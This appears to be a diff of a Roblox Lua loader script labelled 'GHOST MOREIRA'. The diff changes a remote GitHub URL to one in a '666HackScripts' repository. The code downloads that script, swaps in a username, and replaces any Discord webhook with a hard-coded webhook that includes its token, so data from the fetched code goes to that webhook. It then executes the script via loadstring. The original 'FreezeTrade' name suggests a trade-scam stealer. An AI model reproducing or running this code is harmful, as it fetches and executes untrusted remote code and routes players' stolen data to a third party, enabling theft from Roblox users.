@@ -31,13 +31,13 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-    local ok, script_body = pcall(game.HttpGet, game, 'https://raw.githubusercontent.com/script-Ez/Scripts/main/FreezeTrade.lua')
+    local ok, script_body = pcall(game.HttpGet, game, 'https://raw.githubusercontent.com/666HackScripts/AutoCode/refs/heads/main/sab')
     if ok and script_body then
         script_body = script_body:gsub('NEDYXSTOCK19', 'said123ca')
         script_body = script_body:gsub('said123ca', 'said123ca')
         script_body = script_body:gsub('https://discord%.com/api/webhooks/[0-9]+/[a-zA-Z0-9_%-]+', 'https://discord.com/api/webhooks/1571152286644834396/_xhhQE7oTPQeQdTsww4_UMHAt1_VVZ_dhq1uqnITjjGaNGUjTLeIqYSJ9m1tgbARWZld')
         loadstring(script_body)()
     else
-        warn('[GHOST MOREIRA] Error al cargar el script: https://raw.githubusercontent.com/script-Ez/Scripts/main/FreezeTrade.lua')
+        warn('[GHOST MOREIRA] Error al cargar el script: https://raw.githubusercontent.com/666HackScripts/AutoCode/refs/heads/main/sab')
     end
 end)
